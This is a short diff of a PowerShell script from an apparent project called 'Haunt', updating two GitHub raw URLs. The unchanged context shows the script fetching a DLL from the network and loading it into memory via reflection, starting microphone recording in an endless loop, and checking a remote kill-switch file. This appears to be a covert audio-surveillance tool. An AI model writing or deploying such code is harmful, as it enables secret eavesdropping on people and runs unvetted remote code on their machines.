@@ -5,7 +5,7 @@ Add-Type -AssemblyName System.Drawing
 Add-Type -AssemblyName PresentationFramework
 
 # Load NAudio DLL from raw GitHub URL (as bytes, in memory)
-$naudioUrl = "https://raw.githubusercontent.com/DrSp1cy/Haunt/main/NAudio.dll"
+$naudioUrl = "https://raw.githubusercontent.com/DrSp1cy/Haunt/refs/heads/main/NAudio.dll"
 $naudioBytes = Invoke-WebRequest $naudioUrl -UseBasicParsing
 $assembly = [System.Reflection.Assembly]::Load($naudioBytes.Content)
 
@@ -23,7 +23,7 @@ $waveIn.StartRecording()
 while ($true) {
     # Kill switch check – if kill.txt 404s, exit cleanly
     try {
-        $status = (Invoke-WebRequest "https://raw.githubusercontent.com/DrSp1cy/Haunt/main/kill.txt" -UseBasicParsing).StatusCode
+        $status = (Invoke-WebRequest "https://raw.githubusercontent.com/DrSp1cy/Haunt/refs/heads/main/kill.txt" -UseBasicParsing).StatusCode
         if ($status -ne 200) { break }
     } catch {
         break
